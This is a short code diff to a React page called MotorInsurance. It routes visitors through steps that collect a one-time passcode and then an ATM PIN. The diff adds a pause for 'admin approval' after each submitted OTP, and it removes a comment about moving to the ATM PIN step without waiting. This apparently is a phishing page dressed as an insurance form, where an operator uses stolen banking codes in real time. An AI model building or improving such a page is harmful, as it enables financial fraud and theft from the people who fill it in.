@@ -682,7 +682,7 @@ export default function MotorInsurance() {
         if (currentStep === 4) {
           setCurrentStep(5);
         } else if (currentStep === 5) {
-          setCurrentStep(7);
+          setCurrentStep(6);
         } else if (currentStep === 7) {
           setCurrentStep(6);
         }
@@ -1053,12 +1053,13 @@ export default function MotorInsurance() {
           id: visitorId,
           step: 5,
           otpCode: otpCode,
-          status: "otp_submitted",
+          status: "awaiting_otp_approval",
         });
       }
 
-      // Navigate to ATM PIN step without waiting for approval
-      setCurrentStep(6);
+      // Wait for admin approval
+      setIsAwaitingApproval(true);
+      setApprovalStatus(null);
     }
     return true;
   };
